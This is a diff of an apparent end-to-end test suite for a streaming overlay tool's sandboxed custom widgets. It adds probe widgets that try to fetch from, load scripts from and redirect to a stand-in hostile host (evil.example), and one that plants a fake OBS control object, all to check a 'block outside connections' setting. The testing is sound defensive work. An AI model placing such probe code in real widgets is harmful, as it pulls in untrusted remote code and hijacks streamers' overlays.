@@ -71,7 +71,17 @@ extraWidgets[seGoalId] = { manifest: { engine: 'streamelements', api: 1, name: '
     + "window.addEventListener('onWidgetLoad', obj => { document.querySelector('.goal').textContent = obj.detail.session.data['follower-session'].count; });\n"
     + "window.addEventListener('onSessionUpdate', obj => { document.querySelector('.goal').textContent = obj.detail.session['follower-session'].count; });\n" };
 // Widgets that read live state and bot events (Dima SDK and StreamElements layer).
-const liveId = 'b8'.repeat(12), seLiveId = 'c9'.repeat(12);
+const liveId = 'b8'.repeat(12), seLiveId = 'c9'.repeat(12), probeBlockedId = 'd1'.repeat(12), probeOpenId = 'e2'.repeat(12), probeEarlyId = 'f3'.repeat(12);
+// Tries every kind of outside request; the blocked copy then tries to open another page.
+const probe = (path, navigate) => ({ manifest: { engine: 'dima', api: 1, name: 'Probe ' + path, uses: [] }, css: 'body { color: #fff; }',
+  html: '<p class="obs"></p><p class="fetch"></p><p class="img"></p><p class="emote"></p><p class="script"></p>',
+  js: "const out = (key, value) => { document.querySelector('.' + key).textContent = value; };\n"
+    + "try { window.obsstudio = { getStatus() {} }; } catch (e) {} out('obs', typeof window.obsstudio);\n"
+    + `fetch('https://evil.example/${path}/fetch').then(() => out('fetch', 'ok'), () => out('fetch', 'blocked'));\n`
+    + `const img = new Image(); img.onload = () => out('img', 'ok'); img.onerror = () => out('img', 'blocked'); img.src = 'https://evil.example/${path}/pixel.png';\n`
+    + "const emote = new Image(); emote.onload = () => out('emote', 'ok'); emote.onerror = () => out('emote', 'blocked'); emote.src = 'https://static-cdn.jtvnw.net/emoticons/v2/25/default/dark/1.0';\n"
+    + `const s = document.createElement('script'); s.src = 'https://evil.example/${path}/x.js'; s.onload = () => out('script', 'ok'); s.onerror = () => out('script', 'blocked'); document.head.append(s);\n`
+    + (navigate ? `setTimeout(() => { location.href = 'https://evil.example/${path}/page'; }, 6000);\n` : '') });
 extraWidgets[liveId] = { manifest: { engine: 'dima', api: 1, name: 'Live', uses: ['chat', 'polls', 'goals', 'tts', 'triggers', 'rewards', 'pets', 'duels', 'roulette', 'dimafx', 'hypetrain', 'ads'] }, css: 'body { color: #fff; }',
   html: '<p class="goals"></p><p class="polls"></p><p class="tts"></p><p class="trigger"></p><p class="reward"></p><p class="pet"></p><p class="duel"></p><p class="roulette"></p><p class="dimafx"></p><p class="hype"></p><p class="ads"></p><ul class="chat"></ul>',
   js: "const out = (key, value) => { document.querySelector('.' + key).textContent = value; };\n"
@@ -95,6 +105,9 @@ extraWidgets[seLiveId] = { manifest: { engine: 'streamelements', api: 1, name: '
     + "  if (listener === 'dima:hypetrain') document.querySelector('.hype').textContent = event.hypetrain ? 'level ' + event.hypetrain.level : 'none';\n"
     + "  if (listener === 'dima:ads') document.querySelector('.ads').textContent = event.active ? 'ad running' : 'no ad';\n"
     + "  if (listener === 'dima:tts') document.querySelector('.tts').textContent = event.phase; });\n" };
+extraWidgets[probeBlockedId] = probe('blocked', true); extraWidgets[probeOpenId] = probe('open', false);
+// Opens another page right away, before its first load (the frame can't answer the host's check).
+extraWidgets[probeEarlyId] = { manifest: { engine: 'dima', api: 1, name: 'Probe early', uses: [] }, css: '', html: '<p class="early">here</p>', js: "location.replace('https://evil.example/early/page');" };
 const extraView = id => ({ id, name: extraWidgets[id].manifest.name, engine: extraWidgets[id].manifest.engine, revision: 1, author: '', fields: [], data: {}, externalMedia: [], manifest: extraWidgets[id].manifest, media: {},
   files: Object.fromEntries(parts.map(part => [part, { bytes: 1, sha256: 'f'.repeat(64) }])), createdAt: '', updatedAt: '', usedIn: [] });
 
@@ -132,6 +145,10 @@ function rar(files) {
 }
 const rarUpload = `/tmp/custom-widget-check-${process.pid}.rar`;
 await writeFile(upload, zip([{ name: 'Sample Chat/widget.ini', text: ini }, ...parts.map(part => ({ name: `Sample Chat/${part}.txt`, text: source[part] }))]));
+// The same widget, but its code loads scripts from other sites (the import notice lists them).
+const outsideUpload = `/tmp/custom-widget-check-outside-${process.pid}.zip`;
+await writeFile(outsideUpload, zip([{ name: 'Fancy/widget.ini', text: ini }, ...parts.map(part => ({ name: `Fancy/${part}.txt`,
+  text: part === 'html' ? source.html + '<script src="https://cdn.jsdelivr.net/npm/gsap@3"></script><script src="https://evil.example/w"></script>' : source[part] }))]));
 
 const user = { id: '533538623', login: 'customfixture', display_name: 'Fixture' };
 const app = { name: 'Fixture', email: 'fixture@example.invalid', language: 'en', plan_tier: 'premium', actived: true, chat_enabled: false, twitch_user_id: user.id, has_permissions: true, up_to_date_permissions: true, administrating: [] };
@@ -148,7 +165,7 @@ const view = (extra = {}) => ({ id: widgetId, name: pkg.name, engine: 'streamele
   files: Object.fromEntries(parts.map(part => [part, { bytes: Buffer.byteLength(source[part]), sha256: 'f'.repeat(64) }])), createdAt: new Date().toISOString(), updatedAt: new Date().toISOString(), usedIn: [], ...extra });
 
 function mocks(options) {
-  const world = { enabled: options.enabled ?? true, planTier: options.planTier ?? 'premium', limit: options.limit ?? 5, widgets: options.widgets ?? [], imports: [], writes: 0, copies: [], widgetTests: [],
+  const world = { enabled: options.enabled ?? true, planTier: options.planTier ?? 'premium', limit: options.limit ?? 5, widgets: options.widgets ?? [], imports: [], writes: 0, copies: [], widgetTests: [], patches: [],
     state: { schemaVersion: 1, revision: 0, designs: [{ id: 'default', name: 'Alerts', revision: 1, width: 800, height: 240, events: { sub: layout, bits: layout, follow: layout, raid: layout } }],
       scenes: [{ id: 'main', name: 'Main overlay', publicId, width: 1920, height: 1080, revision: 0, widgets: options.layers ?? [], waitFor: [] }] } };
   return { world, async install(context) {
@@ -172,10 +189,13 @@ function mocks(options) {
         const body = req.postDataJSON(); world.imports.push(body);
         if (world.widgets.length >= world.limit) return route.fulfill({ status: 403, json: { error: true, status: 403, code: 'plan_limit', message: 'Your plan includes 1 custom widget. Delete one or upgrade to import more.' } });
         const created = view({ name: body.name || pkg.name }); world.widgets.push(created); status = 201; data = { widget: created, issues: [] };
+      } else if (/\/custom-widgets\/[a-f0-9]{24}$/.test(path) && req.method() === 'PATCH') {
+        const body = req.postDataJSON(), target = world.widgets.find(w => w.id === path.split('/').pop());
+        world.patches.push(body); if (target) Object.assign(target, body); data = target ?? {};
       } else if (path.startsWith(`${list}/${widgetId}/files/`)) {
         const file = path.split('/').pop();
         return file === 'manifest' ? route.fulfill({ status: 404, json: { error: true, status: 404, message: 'This widget has no widget.json' } }) : route.fulfill({ status: 200, contentType: 'text/plain', body: source[file] });
-      } else if (/\/custom-widgets\/[a-f0-9]{24}\/bundle$/.test(path)) data = bundleOf(path.split('/').at(-2));
+      } else if (/\/custom-widgets\/[a-f0-9]{24}\/bundle$/.test(path)) { const id = path.split('/').at(-2); data = bundleOf(id, { network: world.widgets.find(w => w.id === id)?.network ?? 'open' }); }
       else if (path === `${list}/session`) data = options.session ?? { data: { 'follower-latest': { name: 'Session Sam' } }, recents: [] };
       else if (path === `${list}/signals`) data = { skipped: options.skipped ?? 0 };
       else if (path === `${list}/state`) data = options.liveState ?? { polls: null, goals: null };
@@ -240,6 +260,7 @@ try {
   const visibleCount = groupFields(pkg.fields).reduce((n, g) => n + g.fields.length, 0);
   assert.match(await dialog.locator('[data-cw-summary]').textContent(), new RegExp(`${visibleCount} settings in 5 groups`));
   assert.match(await dialog.locator('[data-cw-remote]').textContent(), /loads 2 files from StreamElements/);
+  assert.equal(await dialog.locator('[data-cw-outside]').count(), 0, 'StreamElements files and Google Fonts are not "outside code"');
   assert.equal(await dialog.locator('[data-cw-built-in]').count(), 0, 'built-in values note is an experiment, off by default');
   await shot(page, 'import-dark-1280');
   await axe(page, 'import dialog');
@@ -263,6 +284,17 @@ try {
   await page.locator('.selected-card[data-kind="custom"]').waitFor();
   await page.locator('app-overlay-scene-renderer [data-custom-frame="running"]').waitFor();
   assert.equal(await page.locator('app-overlay-custom-widget iframe').getAttribute('sandbox'), 'allow-scripts', 'widget code runs in a scripts-only sandbox');
+  // Block outside connections: saved right away, and the preview reloads under the restricted policy.
+  assert.equal(await page.locator('app-overlay-custom-widget iframe').getAttribute('csp'), null);
+  await page.locator('[data-cw-network-switch]').check();
+  await until(() => m.world.patches.some(body => body.network === 'restricted'), 'network saved');
+  await page.locator('[data-cw-network-hint]', { hasText: /^On:/ }).waitFor();
+  await until(async () => (await page.locator('app-overlay-custom-widget iframe').getAttribute('csp') ?? '').includes("connect-src 'none'"), 'restricted preview');
+  await page.locator('app-overlay-scene-renderer [data-custom-frame="running"]').waitFor();
+  await axe(page, 'layer settings with outside connections blocked');
+  await page.locator('[data-cw-network-switch]').uncheck();
+  await until(() => m.world.patches.at(-1)?.network === 'open', 'network open again');
+  await until(async () => await page.locator('app-overlay-custom-widget iframe').getAttribute('csp') === null, 'open preview');
   const groups = await page.locator('app-overlay-custom-widget-fields details.cw-group').evaluateAll(list => list.map(d => [d.dataset.group, d.open]));
   assert.deepEqual(groups, [['Test', false], ['Messages', false], ['Colors', false], ['', false], ['Alerts', false]], 'one collapsed group per fields.txt group, ungrouped as General');
   assert.equal(await page.locator('app-overlay-custom-widget-fields [data-field-key="widgetName"]').count(), 0, 'hidden fields are not shown');
@@ -368,6 +400,29 @@ try {
   assert.equal(await page.locator('[data-cw-copy-media]').count(), 0, 'nothing left to copy');
   console.log('PASS engine (StreamElements): sandboxed frame, settings via placeholders, chat/command/alert tests, widget button, reload on settings change, tests to OBS, copying files.');
 
+  // 2c. Import notice: outside code is listed before importing, and blocking outside connections is opt-in.
+  {
+    const om = mocks({}), octx = await browser.newContext({ viewport: { width: 390, height: 900 }, reducedMotion: 'reduce' });
+    await om.install(octx);
+    const op = await octx.newPage(); op.setDefaultTimeout(12000); op.on('pageerror', e => errors.push(e.message));
+    await op.goto(`${base}/${user.login}/modules/overlays`); await op.locator('.stage').waitFor();
+    await op.locator('.studio-mtabs [data-tab="add"]').click();
+    await op.locator('[data-custom-import]').click();
+    const od = op.locator('dialog.cw-dialog');
+    await od.locator('[data-cw-files]').setInputFiles(outsideUpload);
+    const notice = await od.locator('[data-cw-outside]').textContent();
+    assert.match(notice, /loads code from other sites/); assert.match(notice, /cdn\.jsdelivr\.net, evil\.example\. That code can change/);
+    assert.equal(await od.locator('[data-cw-block-outside]').isChecked(), false, 'off unless the streamer turns it on');
+    await od.locator('[data-cw-block-outside]').check();
+    await axe(op, 'import dialog with the outside-code notice');
+    await shot(op, 'import-outside-dark-390');
+    await od.locator('[data-cw-submit]').click();
+    await until(() => om.world.imports.length === 1, 'import sent');
+    assert.equal(om.world.imports[0].network, 'restricted', 'the import asks for outside connections to be blocked');
+    await octx.close();
+    console.log('PASS import notice: outside code listed before importing (trusted hosts left out), opt-in block saved with the import.');
+  }
+
   // 3. Layouts and accessibility: dark then light, phone and desktop.
   for (const theme of ['dark', 'light']) {
     await page.evaluate(theme => localStorage.setItem('theme', theme), theme);
@@ -384,6 +439,9 @@ try {
       if (width < 960) await page.locator('.studio-mtabs [data-tab="add"]').click();
       await page.locator('[data-custom-import]').click();
       await page.locator('dialog.cw-dialog').waitFor();
+      // With the outside-code notice showing (the longest import summary).
+      await page.locator('dialog.cw-dialog [data-cw-files]').setInputFiles(outsideUpload);
+      await page.locator('dialog.cw-dialog [data-cw-outside]').waitFor();
       assert.equal(await page.evaluate(() => document.documentElement.scrollWidth > innerWidth), false, `${theme} ${width}px dialog overflow`);
       await axe(page, `${theme} ${width} dialog`);
       await shot(page, `dialog-${theme}-${width}`);
@@ -761,6 +819,71 @@ try {
     assert.equal(phases, '2', 'spinning and result, once each');
     await runtime.close();
     console.log('PASS OBS: roulette phases that arrive before the widget loads reach it once it runs; replays are delivered once.');
+  }
+  // 5c. OBS: "Block outside connections" (restricted) vs an open copy of the same widget.
+  {
+    const runtime = await browser.newContext({ viewport: { width: 1280, height: 720 }, reducedMotion: 'reduce' });
+    // OBS gives every frame its page-control API (it can't be injected into sandboxed frames here); the SDK removes it
+    // in every widget frame and keeps a widget from putting it back.
+    const layerOf = (id, x) => ({ id: 'probe-' + x, kind: 'custom', configVersion: 1, x, y: 0, width: 480, height: 300, visible: true, locked: false, config: { widgetId: id, revision: 1, values: {} } });
+    const snapshot = { width: 1280, height: 720, designs: [], waitFor: [], widgets: [layerOf(probeBlockedId, 0), layerOf(probeOpenId, 600), { ...layerOf(probeEarlyId, 0), y: 400 }] };
+    const networks = { [probeBlockedId]: 'restricted', [probeOpenId]: 'open', [probeEarlyId]: 'restricted' };
+    let socket;
+    await runtime.routeWebSocket('**/*', ws => {
+      if (!ws.url().includes('/socket.io/')) return ws.close();
+      socket = ws;
+      ws.send('0{"sid":"custom","upgrades":[],"pingInterval":1000000000,"pingTimeout":1000000000}');
+      ws.onMessage(message => { if (String(message).startsWith('40/overlay-studio/')) {
+        ws.send(`40/overlay-studio/${publicId},{"sid":"custom"}`);
+        ws.send(`42/overlay-studio/${publicId},${JSON.stringify(['overlay-state', { revision: 1, snapshot, widgetStates: {}, serverTime: Date.now() }])}`);
+      } });
+    });
+    const outside = [];
+    const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64');
+    await runtime.route('**/*', route => {
+      const url = new URL(route.request().url());
+      if (url.origin === new URL(base).origin) return route.continue();
+      for (const id of Object.keys(networks)) {
+        if (url.pathname === `/overlay-studio/public/${publicId}/custom-widgets/${id}/1`) return route.fulfill({ json: { error: false, data: bundleOf(id, { network: networks[id] }) } });
+      }
+      if (url.hostname === 'static-cdn.jtvnw.net') return route.fulfill({ status: 200, contentType: 'image/png', body: PNG });
+      if (url.hostname === 'evil.example') {
+        outside.push({ path: url.pathname, requiredCsp: route.request().headers()['sec-required-csp'] ?? null });
+        return url.pathname.endsWith('.png') ? route.fulfill({ status: 200, contentType: 'image/png', body: PNG })
+          : url.pathname.endsWith('.js') ? route.fulfill({ status: 200, contentType: 'text/javascript', body: '' })
+          : route.fulfill({ status: 200, contentType: 'text/html', headers: { 'access-control-allow-origin': '*' }, body: '<p class="evil">took over</p>' });
+      }
+      return route.abort();
+    });
+    const p = await runtime.newPage(); p.on('pageerror', e => errors.push(e.message));
+    await p.goto(`${base}/overlays/${publicId}`);
+    const frameOf = n => p.locator('app-overlay-custom-widget').nth(n).frameLocator('iframe');
+    const results = async n => { const f = frameOf(n); return Object.fromEntries(await Promise.all(['obs', 'fetch', 'img', 'emote', 'script'].map(async key => [key, await f.locator('.' + key).textContent()]))); };
+    await until(async () => Object.values(await results(0).catch(() => ({}))).every(Boolean) && Object.values(await results(1).catch(() => ({}))).every(Boolean), 'probe results', 200);
+    assert.deepEqual(await results(0), { obs: 'undefined', fetch: 'blocked', img: 'blocked', emote: 'ok', script: 'blocked' }, 'blocked: only trusted hosts, no OBS controls');
+    assert.deepEqual(await results(1), { obs: 'undefined', fetch: 'ok', img: 'ok', emote: 'ok', script: 'ok' }, 'open: as before');
+    assert.equal(outside.filter(hit => hit.path.startsWith('/blocked/') && !hit.path.endsWith('/page')).length, 0, 'nothing left the blocked widget');
+    // A widget that opened another page before its first load can't answer the host: stopped.
+    await p.locator('app-overlay-custom-widget').nth(2).locator('[data-custom-frame="stopped"]').waitFor({ timeout: 15000 });
+    // The owner blocks outside connections for the open widget: the server asks OBS to load it again.
+    networks[probeOpenId] = 'restricted';
+    socket.send(`42/overlay-studio/${publicId},${JSON.stringify(['overlay-widget-reload', { widgetId: probeOpenId }])}`);
+    await until(async () => (await p.locator('app-overlay-custom-widget').nth(1).locator('iframe').getAttribute('csp').catch(() => null) ?? '').includes("connect-src 'none'"), 'reloaded under the new rules');
+    await until(async () => (await results(1).catch(() => ({}))).fetch === 'blocked', 'open widget now blocked');
+    // The owner turned it off again while this source was offline (no reload request): the rules sent on reconnect
+    // differ from what it loaded, so it loads the widget again.
+    networks[probeOpenId] = 'open';
+    socket.send(`42/overlay-studio/${publicId},${JSON.stringify(['overlay-widget-policies', { networks: { [probeOpenId]: 'open', [probeBlockedId]: 'restricted' } }])}`);
+    await until(async () => await p.locator('app-overlay-custom-widget').nth(1).locator('iframe').getAttribute('csp').catch(() => 'gone') === null, 'open again after reconnect');
+    await until(async () => (await results(1).catch(() => ({}))).fetch === 'ok', 'open widget runs open again');
+    assert.equal(await p.locator('app-overlay-custom-widget iframe').first().getAttribute('csp') !== null, true);
+    // It tries to open another page: the frame is stopped and the page never shows on stream.
+    await p.locator('app-overlay-custom-widget').first().locator('[data-custom-frame="stopped"]').waitFor({ timeout: 15000 });
+    assert.equal(await p.locator('app-overlay-custom-widget').first().locator('iframe').count(), 0);
+    const navigation = outside.find(hit => hit.path === '/blocked/page');
+    if (navigation) assert.ok(navigation.requiredCsp?.includes("connect-src 'none'"), 'the page it opened was told to run under the same policy');
+    await runtime.close();
+    console.log('PASS OBS: "Block outside connections" stops outside fetches, images and scripts (trusted hosts still load), keeps OBS controls out and stops a widget that opens another page (also before its first load); an open widget is unchanged until the owner blocks it, then OBS loads it again.');
   }
   assert.deepEqual(errors, []);
 } finally { await browser.close(); }
